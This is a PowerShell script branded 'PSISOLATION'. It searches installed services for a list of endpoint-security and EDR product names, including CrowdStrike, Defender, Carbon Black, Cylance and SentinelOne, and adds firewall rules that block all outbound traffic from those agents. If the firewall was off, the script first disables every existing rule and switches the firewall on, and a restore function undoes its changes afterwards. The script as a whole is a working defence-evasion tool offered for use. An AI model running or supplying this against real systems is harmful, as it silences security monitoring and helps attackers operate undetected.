# Global variable to track whether the script enabled the firewall or not
$global:ScriptEnabledFirewall = $false
# Path for the firewall rules backup file
$FirewallBackupFile = "$env:Temp\FirewallRulesBackup.wfw"

function Show-Banner {
    $banner = @"
██████╗ ███████╗██╗███████╗ ██████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██║██╔════╝██╔═══██╗██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██████╔╝███████╗██║███████╗██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██╔═══╝ ╚════██║██║╚════██║██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║     ███████║██║███████║╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝     ╚══════╝╚═╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
"@
    Write-Host $banner
}

# Define the list of keywords to detect in service DisplayNames
$MonitoringProc = @(
    "EDR", "F-Secure", "withsecure", "Defender", "Elastic", "Trellix", "Qualys", "Sentinel", "LogProcessorService", "AmSvc", "CrAmTray", "ExecutionPreventionSvc", "Crowdstrike", "csagent", "Cylance",
    "Cybereason", "Carbon Black", "CB Defense", "Tanium", "Cortex", "ESET", "Harfang", "Trend", "WinCollect"
)

# Name of the custom filter for identifying everything created by the script
$CustomFilterName = "Custom Outbound Rule"

# Check if Windows Firewall is enabled
function Check-FirewallStatus {
    $FirewallProfiles = Get-NetFirewallProfile
    $FirewallEnabled = $FirewallProfiles | Where-Object { $_.Enabled -eq $true }

    if ($FirewallEnabled) {
        return $true
    } else {
        return $false
    }
}

# Export all firewall rules to a backup file
function Export-FirewallRules {
    param (
        [string]$ExportFile
    )
    Write-Output "[*] Exporting current firewall rules to $ExportFile..."
    netsh advfirewall export $ExportFile | Out-Null
}

# Restore firewall rules from a backup file
function Restore-FirewallRules {
    param (
        [string]$ExportFile
    )
    if (Test-Path $ExportFile) {
        Write-Output "[*] Restoring firewall rules from $ExportFile..."
        netsh advfirewall import $ExportFile | Out-Null
        Remove-Item -Path $ExportFile -ErrorAction SilentlyContinue
        Write-Output "[*] Firewall rules restored successfully."
    } else {
        Write-Warning "Backup file not found. Unable to restore firewall rules."
    }
}

# Retrieve executable paths of services whose DisplayName contains any of the keyword
function Get-MatchedServicePaths {
    param (
        [string[]]$Keywords
    )

    $MatchedServices = @{}
    $Services = Get-Service -ErrorAction SilentlyContinue

    foreach ($Service in $Services) {
        try {
            $DisplayName = $Service.DisplayName
            $ServiceName = $Service.Name

            if ($Keywords | Where-Object { $DisplayName -like "*$_*" }) {
                $WMIService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'"
                if ($WMIService -and $WMIService.PathName) {
                    $ExecutablePath = $WMIService.PathName.Split('"')[1]
                    if ($ExecutablePath) {
                        $MatchedServices[$ServiceName] = @{
                            DisplayName = $DisplayName
                            Path = $ExecutablePath
                        }
                    }
                }
            }
        } catch {
            Write-Warning "Failed to retrieve service details for: $($Service.Name). Error: $_"
        }
    }

    return $MatchedServices
}

# Create firewall rules for identified processes
function Block-MonitoringProc {
    Show-Banner
    Write-Output "Checking for monitoring services..."

    $FirewallEnabled = Check-FirewallStatus
    if (-not $FirewallEnabled) {
        Write-Warning "Windows Firewall is disabled. Enabling it and exporting existing rules..."
        Export-FirewallRules -ExportFile $FirewallBackupFile

        Write-Output "[*] Disabling all current firewall rules..."
        Disable-NetFirewallRule -All

        Write-Output "[*] Enabling Windows Firewall..."
        Set-NetFirewallProfile -All -Enabled True
        $global:ScriptEnabledFirewall = $true # Make sure the global variable is updated
    }

    $MatchedServices = Get-MatchedServicePaths -Keywords $MonitoringProc

    if ($MatchedServices.Count -eq 0) {
        Write-Output "[-] No matching services detected."
        return
    }

    foreach ($ServiceName in $MatchedServices.Keys) {
        $ServiceDetails = $MatchedServices[$ServiceName]
        $ProcessPath = $ServiceDetails.Path
        $DisplayName = $ServiceDetails.DisplayName

        if (-not (Test-Path $ProcessPath)) {
            Write-Warning "Invalid executable path for service: $ServiceName ($ProcessPath). Skipping..."
            continue
        }

        $FirewallDisplayName = "${CustomFilterName}: $DisplayName"
        if ($FirewallDisplayName.Length -gt 255) {
            $FirewallDisplayName = $FirewallDisplayName.Substring(0, 255)
        }

        Write-Output "Blocking outbound traffic for service: $DisplayName ($ProcessPath)"
        try {
            New-NetFirewallRule -DisplayName $FirewallDisplayName `
                -Direction Outbound `
                -Action Block `
                -Program $ProcessPath `
                -Protocol Any `
                -Profile Any `
                -Description "Blocks outbound traffic for monitoring service $DisplayName"
            Write-Output "Successfully blocked traffic for service: $DisplayName."
        } catch {
            Write-Warning "Failed to block traffic for service: $DisplayName. $_"
        }
    }
}

# Remove all custom firewall rules and restore the previous state
function Unblock-AllFilters {
    Show-Banner
    Write-Output "Removing all custom firewall rules..."

    if ($global:ScriptEnabledFirewall) {
        Write-Warning "The script enabled the firewall. Restoring previous state..."
        Restore-FirewallRules -ExportFile $FirewallBackupFile

        Write-Output "[*] Disabling Windows Firewall..."
        Set-NetFirewallProfile -All -Enabled False
        $global:ScriptEnabledFirewall = $false # Reset the global variable
        return
    }

    $Rules = Get-NetFirewallRule | Where-Object { $_.DisplayName -like "$CustomFilterName*" }
    if ($Rules.Count -eq 0) {
        Write-Output "[-] No custom firewall rules found."
        return
    }

    foreach ($Rule in $Rules) {
        try {
            Remove-NetFirewallRule -DisplayName $Rule.DisplayName
            Write-Output "Removed filter: $($Rule.DisplayName)"
        } catch {
            Write-Warning "Failed to remove filter $($Rule.DisplayName): $_"
        }
    }
}
